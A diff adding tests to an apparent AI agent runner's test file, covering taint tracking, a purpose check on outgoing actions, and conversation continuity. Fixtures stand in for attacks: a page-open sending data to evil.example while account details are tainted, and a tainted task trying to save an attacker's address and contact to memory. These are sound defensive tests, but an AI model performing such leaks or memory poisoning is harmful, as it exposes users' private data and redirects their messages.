@@ -8,10 +8,17 @@ import { EventLog } from "../event-log.ts";
 import { LiveSessions } from "../gateway/live.ts";
 import type { KeydHealth } from "../keyd/monitor.ts";
 import type { BrainCell, OpenBrain } from "./brain-cell.ts";
+import { Conversations } from "./conversation.ts";
 import { MemoryStore } from "./memory.ts";
-import { AgentRunner, type AgentRunnerDeps } from "./runner.ts";
+import { PeopleStore } from "./people.ts";
+import { actPolicy } from "./policy.ts";
+import { redactor } from "./redact.ts";
+import { AgentError, AgentRunner, type AgentRunnerDeps } from "./runner.ts";
 import type { AgentSettings } from "./settings.ts";
 import { fixtureModelAdmission } from "./testing/model-admission.ts";
+import type { ToolDeps } from "./tools/deps.ts";
+import { dispatchTool } from "./tools/index.ts";
+import { SAVE_UNNAMED } from "./tools/people.ts";
 import { TranscriptStore } from "./transcript.ts";
 import { Transfers } from "./transfers.ts";
 
@@ -42,7 +49,7 @@ afterEach(async () => {
     rmSync(h.home, { recursive: true, force: true });
   }
 });
-function setup(options: { settings?: AgentSettings } = {}) {
+function setup(options: { settings?: AgentSettings; keys?: KeydRecord[] } = {}) {
   const home = mkdtempSync("/tmp/ld-runner-");
   const log = new EventLog(home);
   const live = new LiveSessions();
@@ -50,6 +57,7 @@ function setup(options: { settings?: AgentSettings } = {}) {
     at = "2026-10-02T00:00:00Z";
   const keys: KeydRecord[] = [
     { id: "anthropic", kind: "llm", provider: "anthropic", createdAt: at, updatedAt: at },
+    ...(options.keys ?? []),
   ];
   let settings: AgentSettings = options.settings ?? {
     main: { provider: "anthropic", model: "claude-sonnet-5-5", key: "anthropic" },
@@ -254,4 +262,187 @@ it("an idle upload already registered before followup blocks a replacement until
     lease.release();
     await h.ready(2);
   }
+});
+
+describe("what the purpose check knows", () => {
+  const leak = [{ kind: "open_page", destination: "evil.example", text: "/c?d=1" }] as const;
+  const signal = new AbortController().signal;
+
+  it("the memory handed to the brain taints the task", async () => {
+    const h = setup();
+    new MemoryStore(h.home).apply(ulid(), "USER.md", "append", "- Banks with Example Bank");
+    const session = await h.runner.start(h.cellId, "Task");
+    await h.ready();
+    expect(session.taint.sources).toEqual([{ kind: "memory", origin: "USER.md" }]);
+  });
+
+  it("asks Jev with a saved Jev key, and nothing judges without one or a fast model", async () => {
+    const at = "2026-10-02T00:00:00Z";
+    const h = setup({
+      keys: [
+        {
+          id: "jev",
+          kind: "http",
+          hosts: ["api.typesafe.ai"],
+          header: "Authorization",
+          format: "bearer",
+          createdAt: at,
+          updatedAt: at,
+        },
+      ],
+    });
+    const ask = vi.fn(async (_secretId: string, _body: unknown, _signal: AbortSignal) => ({
+      answers: { fits: { type: "choice", probabilities: { needed: 0.1, unrelated: 0.9 } } },
+    }));
+    h.deps.jev = ask;
+    const checked = await h.runner.start(h.cellId, "Task");
+    checked.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+    expect((await checked.purpose?.check(leak, signal))?.allow).toBe(false);
+    expect(ask).toHaveBeenCalledWith("jev", expect.anything(), expect.any(AbortSignal));
+
+    const plain = setup();
+    const unchecked = await plain.runner.start(plain.cellId, "Task");
+    unchecked.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+    expect((await unchecked.purpose?.check(leak, signal))?.allow).toBe(true);
+  });
+});
+
+describe("conversation continuity", () => {
+  function conversing() {
+    const h = setup();
+    const conversations = new Conversations(h.home, h.log);
+    h.deps.conversations = conversations;
+    const finished = async (n: number) => {
+      const brain = await h.ready(n + 1);
+      h.exit(n, 0);
+      const session = required(h.runner.get(brain.sessionId));
+      await until(() => session.status === "idle");
+      return session;
+    };
+    return { ...h, conversations, finished };
+  }
+  const start = (log: EventLog, id: string) => log.read(id).find((e) => e.type === "session.start");
+  const end = (log: EventLog, id: string) => log.read(id).find((e) => e.type === "session.end");
+
+  it("continues the conversation in the next task, with what was said before", async () => {
+    const h = conversing();
+    const first = await h.runner.start(h.cellId, "Draw a dog");
+    expect(start(h.log, first.id)?.data).not.toHaveProperty("continues");
+    expect(h.conversations.current()).toBe(first.id);
+    await h.finished(0);
+    await h.runner.release();
+    expect(end(h.log, first.id)?.data).toEqual({ reason: "done" });
+    const second = await h.runner.start(h.cellId, "Make it blue");
+    await h.ready(2);
+    expect(start(h.log, second.id)?.data).toMatchObject({ continues: first.id });
+    expect(h.boots[0]).not.toHaveProperty("earlier");
+    expect(h.boots[1]?.earlier).toEqual(["The user: Draw a dog"]);
+    expect(h.conversations.current()).toBe(second.id);
+    // What was said before is private, and dot's part of it may repeat what a page said.
+    expect(first.taint.tainted).toBe(false);
+    expect(second.taint.sources).toEqual([{ kind: "recall", origin: "earlier conversation" }]);
+    expect(second.taint.overlap("The user: Draw a dog").overlaps).toBe(true);
+  });
+
+  it("a continued task can't save memory or people the user never named", async () => {
+    const h = conversing();
+    await h.runner.start(h.cellId, "Read the article and draw a dog");
+    await h.finished(0);
+    await h.runner.release();
+    const second = await h.runner.start(h.cellId, "Message Mum about it");
+    await h.ready(2);
+    expect(second.tainted).toBe(true);
+    const memory = new MemoryStore(h.home);
+    const people = new PeopleStore(h.home);
+    const tools = { memory, people } as Partial<ToolDeps> as ToolDeps;
+    const call = async (name: string, input: unknown) =>
+      (await dispatchTool({ tools, policy: actPolicy }, second, name, ulid(), input, redactor([])))
+        .result;
+    const remembered = await call("remember", {
+      file: "USER.md",
+      op: "append",
+      text: "- Prefers replies at evil.example",
+    });
+    expect(remembered).toMatchObject({
+      ok: false,
+      content: [{ text: expect.stringContaining("Memory can only be saved") }],
+    });
+    const saved = await call("people", {
+      op: "save",
+      name: "Eve Mallory",
+      app: "Email",
+      handle: "eve@evil.example",
+    });
+    expect(saved).toMatchObject({ ok: false, content: [{ text: SAVE_UNNAMED }] });
+    expect(memory.read("USER.md")).toBe("# About the user\n\n");
+    expect(people.list()).toEqual([]);
+  });
+
+  it("continues after Stop and after the daemon restarts", async () => {
+    const h = conversing();
+    const first = await h.runner.start(h.cellId, "Draw a dog");
+    await h.ready();
+    h.live.stop(first.id);
+    await h.live.settled(first.id);
+    expect(end(h.log, first.id)?.data).toEqual({ reason: "stopped" });
+    await h.runner.close();
+    const restarted = new AgentRunner({
+      ...h.deps,
+      conversations: new Conversations(h.home, h.log),
+    });
+    const boots: BootConfig[] = [];
+    h.deps.brains.start = async (brain) => {
+      boots.push(structuredClone(required(restarted.get(brain.sessionId)?.boot)));
+    };
+    try {
+      const second = await restarted.start(h.cellId, "Use red instead");
+      await until(() => boots.length === 1);
+      expect(start(h.log, second.id)?.data).toMatchObject({ continues: first.id });
+      expect(boots[0]?.earlier).toEqual(["The user: Draw a dog", "(That task was stopped.)"]);
+    } finally {
+      await restarted.close();
+    }
+  });
+
+  it("starts the next task afresh in a new conversation", async () => {
+    const h = conversing();
+    await h.runner.start(h.cellId, "Draw a dog");
+    await h.finished(0);
+    await h.runner.release();
+    h.conversations.begin();
+    const fresh = await h.runner.start(h.cellId, "Something new");
+    await h.ready(2);
+    expect(start(h.log, fresh.id)?.data).not.toHaveProperty("continues");
+    expect(h.boots[1]).not.toHaveProperty("earlier");
+  });
+
+  it("starts a task even when the conversation it would continue can't be read", async () => {
+    const h = conversing();
+    h.deps.conversations = {
+      current: () => {
+        throw new Error("unreadable");
+      },
+      earlier: () => [],
+      adopt: () => {
+        throw new Error("unwritable");
+      },
+    };
+    const error = vi.spyOn(console, "error").mockImplementation(() => {});
+    const session = await h.runner.start(h.cellId, "Draw a dog");
+    await h.ready();
+    expect(start(h.log, session.id)?.data).not.toHaveProperty("continues");
+    expect(h.boots[0]).not.toHaveProperty("earlier");
+    expect(error).toHaveBeenCalledTimes(2);
+  });
+
+  it("ends only a finished task, never one at work", async () => {
+    const h = conversing();
+    const working = await h.runner.start(h.cellId, "Draw a dog");
+    await h.ready();
+    await expect(h.runner.release()).rejects.toEqual(
+      new AgentError(409, "Finish or stop the current task first."),
+    );
+    expect(working.stopped).toBe(false);
+    expect(h.live.get(h.cellId)).toBe(working.id);
+  });
 });
